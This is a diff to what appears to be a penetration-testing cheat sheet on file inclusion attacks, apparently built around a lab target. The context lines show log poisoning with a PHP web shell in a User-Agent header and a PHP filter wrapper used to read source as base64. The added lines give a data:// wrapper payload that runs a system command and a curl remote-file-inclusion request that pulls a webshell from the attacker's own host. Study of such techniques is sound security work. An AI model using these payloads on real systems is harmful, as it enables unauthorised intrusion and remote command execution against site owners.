@@ -22,7 +22,7 @@
 * Does the applicatoin write to the log? Maybe add a php web shell to your headers...
  ```User-Agnet Mozilla/5.0 <?php echo system($_GET['cmd']); ?>```
 
-### PHP Wrappers
+### PHP (and Data) Wrappers
 
 Gives the ability to read files... even php files. 
 
@@ -35,6 +35,16 @@ Will yield this... which decoded is the php code
 PCFET0NUWVBFIGh0bWw+CjxodG1sIGxhbmc9ImVuIj4KPGhlYWQ+CiAgICA8bWV0YSBjaGFyc2V0PSJVVEYtOCI+CiAgICA8bWV0YSBuYW1lPSJ2aWV3cG9ydCIgY29udGVudD0id2lkdGg9ZGV2aWNlLXdpZHRoLCBpbml0aWFsLXNjYWxlPTEuMCI+CiAgICA8dGl0bGU+TWFpbn...
 dF9lcnJvcik7Cn0KZWNobyAiQ29ubmVjdGVkIHN1Y2Nlc3NmdWxseSI7Cj8+Cgo8L2JvZHk+CjwvaHRtbD4K
 ```
+
+Or we can achieve command injection using a data wrapper:
+
+```http://mountaindesserts.com/meteor/index.php?page=data://text/plain,<?php%20echo%20system('ls');?>```
+
+### Remote File Inclusion
+
+Reach out and touch your own hosted webshell
+
+```curl "http://mountaindesserts.com/meteor/index.php?page=http://[my-ipaddress]/simple-backdoor.php&cmd=ls"```
 
 ## SQL Injection
 
